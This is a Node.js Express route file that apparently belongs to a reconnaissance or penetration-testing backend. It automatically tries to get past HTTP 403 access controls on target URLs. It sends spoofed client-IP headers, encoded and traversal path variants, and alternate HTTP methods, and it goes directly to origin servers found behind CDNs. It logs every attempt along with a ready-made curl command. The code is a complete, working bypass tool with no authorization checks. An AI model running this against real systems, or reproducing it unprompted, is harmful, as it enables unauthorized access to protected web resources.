// backend/routes/bypass403Routes.cjs
// 403 Bypass — tracks EVERY attempt so you can see exactly what was tried

'use strict';

const https   = require('https');
const http    = require('http');
const fs      = require('fs');
const path    = require('path');
const express = require('express');
const router  = express.Router();
const { URL } = require('url');

const WORKSPACE_DIR = path.resolve(__dirname, '../workspace');
const activeRuns    = new Set();

const HEADER_BYPASSES = [
  { label: 'X-Forwarded-For: 127.0.0.1',                     headers: { 'X-Forwarded-For': '127.0.0.1' } },
  { label: 'X-Forwarded-For + X-Originating-IP: 127.0.0.1', headers: { 'X-Forwarded-For': '127.0.0.1', 'X-Originating-IP': '127.0.0.1' } },
  { label: 'X-Real-IP: 127.0.0.1',                           headers: { 'X-Real-IP': '127.0.0.1' } },
  { label: 'X-Custom-IP-Authorization: 127.0.0.1',           headers: { 'X-Custom-IP-Authorization': '127.0.0.1' } },
  { label: 'X-Forward-For: 127.0.0.1',                       headers: { 'X-Forward-For': '127.0.0.1' } },
  { label: 'Client-IP: 127.0.0.1',                           headers: { 'Client-IP': '127.0.0.1' } },
  { label: 'True-Client-IP: 127.0.0.1',                      headers: { 'True-Client-IP': '127.0.0.1' } },
  { label: 'Forwarded: for=127.0.0.1',                       headers: { 'Forwarded': 'for=127.0.0.1' } },
  { label: 'X-ProxyUser-Ip: 127.0.0.1',                      headers: { 'X-ProxyUser-Ip': '127.0.0.1' } },
  { label: 'X-Remote-IP: 127.0.0.1',                         headers: { 'X-Remote-IP': '127.0.0.1' } },
  { label: 'X-Remote-Addr: 127.0.0.1',                       headers: { 'X-Remote-Addr': '127.0.0.1' } },
  { label: 'X-Host: 127.0.0.1',                              headers: { 'X-Host': '127.0.0.1' } },
  { label: 'X-Forwarded-Host: 127.0.0.1',                    headers: { 'X-Forwarded-Host': '127.0.0.1' } },
  { label: 'X-Originating-IP: 127.0.0.1',                    headers: { 'X-Originating-IP': '127.0.0.1' } },
  { label: 'X-Forwarded-For: localhost',                      headers: { 'X-Forwarded-For': 'localhost' } },
  { label: 'X-Forwarded-For: 0.0.0.0',                       headers: { 'X-Forwarded-For': '0.0.0.0' } },
  { label: 'X-Forwarded-For: 192.168.1.1',                   headers: { 'X-Forwarded-For': '192.168.1.1' } },
  { label: 'X-Forwarded-For: 10.0.0.1',                      headers: { 'X-Forwarded-For': '10.0.0.1' } },
];

function buildPathVariants(urlPath) {
  const variants = [];
  const seen = new Set([urlPath]);
  const add = (p, label) => { if (!seen.has(p)) { seen.add(p); variants.push({ path: p, label }); } };

  add(urlPath + '/',        'Trailing slash');
  add('//' + urlPath.replace(/^\//, ''), 'Double slash prefix');
  add(urlPath.replace(/^\//, '/./'),     'Dot-slash prefix (/./path)');
  add('/.' + urlPath,       'Dot prefix (/.path)');
  add(urlPath + '%20',      'Space suffix (%20)');
  add(urlPath + '%09',      'Tab suffix (%09)');
  add(urlPath + '?',        'Question mark suffix');
  add(urlPath + '#',        'Hash suffix');
  add(urlPath + '..;/',     'Semicolon path traversal');
  add(urlPath + ';/',       'Semicolon suffix');
  add(urlPath + '%00',      'Null byte suffix');
  add(urlPath.replace(/\//g, '%2f'),       'Slash URL-encoded lower (%2f)');
  add(urlPath.replace(/\//g, '%2F'),       'Slash URL-encoded upper (%2F)');
  add(urlPath.replace(/\//g, '%ef%bc%8f'), 'Unicode fullwidth slash');
  add(urlPath.replace(/\./g, '%2e'),       'Dot URL-encoded (%2e)');
  add(urlPath.toUpperCase(), 'Uppercase path');
  return variants;
}

const METHOD_BYPASSES = ['POST', 'PUT', 'PATCH', 'OPTIONS', 'TRACE', 'HEAD', 'DELETE'];

function makeRequest(ip, port, scheme, hostname, urlPath, extraHeaders, method, timeoutMs) {
  method     = method     || 'GET';
  timeoutMs  = timeoutMs  || 8000;
  return new Promise((resolve) => {
    try {
      const mod = scheme === 'https' ? https : http;
      const req = mod.request({
        host: ip, port: port || (scheme === 'https' ? 443 : 80),
        path: urlPath, method, timeout: timeoutMs,
        rejectUnauthorized: false,
        headers: { 'Host': hostname, 'User-Agent': 'Mozilla/5.0', 'Accept': '*/*', ...extraHeaders },
      }, (res) => {
        let body = '';
        res.on('data', d => { body += d; if (body.length > 2000) res.destroy(); });
        res.on('end',  () => resolve({ status: res.statusCode, body: body.slice(0, 400) }));
        res.on('close',() => resolve({ status: res.statusCode, body: body.slice(0, 400) }));
      });
      req.on('timeout', () => { req.destroy(); resolve({ status: null }); });
      req.on('error',   () => resolve({ status: null }));
      req.end();
    } catch { resolve({ status: null }); }
  });
}

function buildCurl(scheme, hostname, port, urlPath, method, headers) {
  const defPort = scheme === 'https' ? 443 : 80;
  const portStr = port !== defPort ? `:${port}` : '';
  const url     = `${scheme}://${hostname}${portStr}${urlPath}`;
  const hParts  = Object.entries(headers)
    .filter(([k]) => !['Host','User-Agent','Accept'].includes(k))
    .map(([k, v]) => `-H "${k}: ${v}"`);
  const mPart   = method !== 'GET' ? [`-X ${method}`] : [];
  return ['curl -sk', ...mPart, ...hParts, `"${url}"`].join(' \\\n  ');
}

function load403Findings(target) {
  const f = path.join(WORKSPACE_DIR, target, 'confidential', 'findings.json');
  if (!fs.existsSync(f)) return [];
  try { return JSON.parse(fs.readFileSync(f, 'utf8')).filter(x => x.status_code === 403); }
  catch { return []; }
}

function loadOriginIPs(target) {
  const f = path.join(WORKSPACE_DIR, target, 'originip', 'results.json');
  if (!fs.existsSync(f)) return [];
  try { return JSON.parse(fs.readFileSync(f, 'utf8')); } catch { return []; }
}

function getPaths(target) {
  const base = path.join(WORKSPACE_DIR, target, 'bypass403');
  return { base, status: path.join(base, 'status.json'), results: path.join(base, 'results.json') };
}

function writeStatus(f, d) { fs.writeFileSync(f, JSON.stringify(d, null, 2)); }

async function run403Bypass(target) {
  const p = getPaths(target);
  fs.mkdirSync(p.base, { recursive: true });

  const findings403  = load403Findings(target);
  const originIPData = loadOriginIPs(target);

  if (findings403.length === 0) {
    writeStatus(p.status, { status: 'error', error: 'No 403 findings — run Confidential scan first' });
    return;
  }

  const hostToOrigin = {};
  for (const r of originIPData) {
    if (!r.ip || r.behind_cdn) continue;
    for (const host of (r.hosts || [])) {
      if (!hostToOrigin[host] || r.direct_access)
        hostToOrigin[host] = { ip: r.ip, confirmed: !!r.direct_access };
    }
  }

  // One result per URL — holds all attempts for that URL
  const results = findings403.map(f => ({
    url:        f.file_path,
    host:       '',
    origin_ip:  null,
    via_origin: false,
    bypassed:   false,
    done:       false,
    attempts:   [],
    winning:    null,
  }));

  fs.writeFileSync(p.results, JSON.stringify(results, null, 2));
  writeStatus(p.status, { status: 'running', total: results.length, done: 0, bypassed: 0 });

  for (let i = 0; i < results.length; i++) {
    const entry   = results[i];
    let targetURL;
    try { targetURL = new URL(findings403[i].file_path); }
    catch { entry.done = true; fs.writeFileSync(p.results, JSON.stringify(results, null, 2)); continue; }

    const hostname = targetURL.hostname;
    const urlPath  = targetURL.pathname;
    const scheme   = targetURL.protocol.replace(':', '');
    const port     = targetURL.port ? parseInt(targetURL.port) : (scheme === 'https' ? 443 : 80);
    const origin   = hostToOrigin[hostname];
    const attackIP = origin ? origin.ip : hostname;

    entry.host       = hostname;
    entry.origin_ip  = origin ? origin.ip : null;
    entry.via_origin = !!origin;

    console.log(`[bypass403] [${i+1}/${results.length}] ${findings403[i].file_path}`);

    // ── 1. IP spoof headers ──────────────────────────────────────────────────
    for (const hb of HEADER_BYPASSES) {
      const res = await makeRequest(attackIP, port, scheme, hostname, urlPath, hb.headers);
      const ok  = res.status === 200;
      entry.attempts.push({
        technique: 'header',
        label:     hb.label,
        detail:    Object.entries(hb.headers).map(([k,v]) => `${k}: ${v}`).join(', '),
        path:      urlPath,
        method:    'GET',
        status:    res.status,
        success:   ok,
        curl:      buildCurl(scheme, hostname, port, urlPath, 'GET', hb.headers),
      });
      if (ok) { entry.bypassed = true; entry.winning = entry.attempts[entry.attempts.length - 1]; break; }
    }
    if (entry.bypassed) { entry.done = true; fs.writeFileSync(p.results, JSON.stringify(results, null, 2)); writeStatus(p.status, { status: 'running', total: results.length, done: results.filter(r=>r.done).length, bypassed: results.filter(r=>r.bypassed).length }); continue; }

    // ── 2. Path manipulation ─────────────────────────────────────────────────
    for (const pv of buildPathVariants(urlPath)) {
      const res = await makeRequest(attackIP, port, scheme, hostname, pv.path, {});
      const ok  = res.status === 200;
      entry.attempts.push({
        technique: 'path',
        label:     pv.label,
        detail:    pv.path,
        path:      pv.path,
        method:    'GET',
        status:    res.status,
        success:   ok,
        curl:      buildCurl(scheme, hostname, port, pv.path, 'GET', {}),
      });
      if (ok) { entry.bypassed = true; entry.winning = entry.attempts[entry.attempts.length - 1]; break; }
    }
    if (entry.bypassed) { entry.done = true; fs.writeFileSync(p.results, JSON.stringify(results, null, 2)); writeStatus(p.status, { status: 'running', total: results.length, done: results.filter(r=>r.done).length, bypassed: results.filter(r=>r.bypassed).length }); continue; }

    // ── 3. HTTP method override ──────────────────────────────────────────────
    for (const method of METHOD_BYPASSES) {
      const res = await makeRequest(attackIP, port, scheme, hostname, urlPath, {}, method);
      const ok  = res.status === 200;
      entry.attempts.push({
        technique: 'method',
        label:     `HTTP ${method}`,
        detail:    method,
        path:      urlPath,
        method,
        status:    res.status,
        success:   ok,
        curl:      buildCurl(scheme, hostname, port, urlPath, method, {}),
      });
      if (ok) { entry.bypassed = true; entry.winning = entry.attempts[entry.attempts.length - 1]; break; }
    }

    entry.done = true;
    fs.writeFileSync(p.results, JSON.stringify(results, null, 2));
    writeStatus(p.status, {
      status:   'running',
      total:    results.length,
      done:     results.filter(r => r.done).length,
      bypassed: results.filter(r => r.bypassed).length,
    });
    console.log(`  ${entry.bypassed ? '✓ BYPASSED' : '✗ held'} — ${entry.attempts.length} attempts`);
  }

  const bypassed = results.filter(r => r.bypassed);
  writeStatus(p.status, {
    status:        'done',
    total:         results.length,
    done:          results.length,
    bypassed:      bypassed.length,
    held:          results.length - bypassed.length,
    viaOrigin:     bypassed.filter(r => r.via_origin).length,
    viaCDN:        bypassed.filter(r => !r.via_origin).length,
    totalAttempts: results.reduce((a, r) => a + r.attempts.length, 0),
    completedAt:   new Date().toISOString(),
  });
}

router.post('/:target', async (req, res) => {
  const { target } = req.params;
  if (!target || !/^[\w.\-]+$/.test(target)) return res.status(400).json({ error: 'Invalid target' });
  if (activeRuns.has(target)) return res.status(409).json({ error: 'Already running' });
  res.json({ message: 'Started', target });
  activeRuns.add(target);
  try { await run403Bypass(target); } catch (e) { console.error('[bypass403]', e.message); } finally { activeRuns.delete(target); }
});

router.get('/:target', (req, res) => {
  const { target } = req.params;
  if (!target || !/^[\w.\-]+$/.test(target)) return res.status(400).json({ error: 'Invalid target' });
  const p = getPaths(target);
  let status = { status: 'not_started', total: 0, done: 0, bypassed: 0 };
  let results = [];
  if (fs.existsSync(p.status))  try { status  = JSON.parse(fs.readFileSync(p.status,  'utf8')); } catch {}
  if (fs.existsSync(p.results)) try { results = JSON.parse(fs.readFileSync(p.results, 'utf8')); } catch {}
  res.json({ ...status, results });
});

module.exports = router;
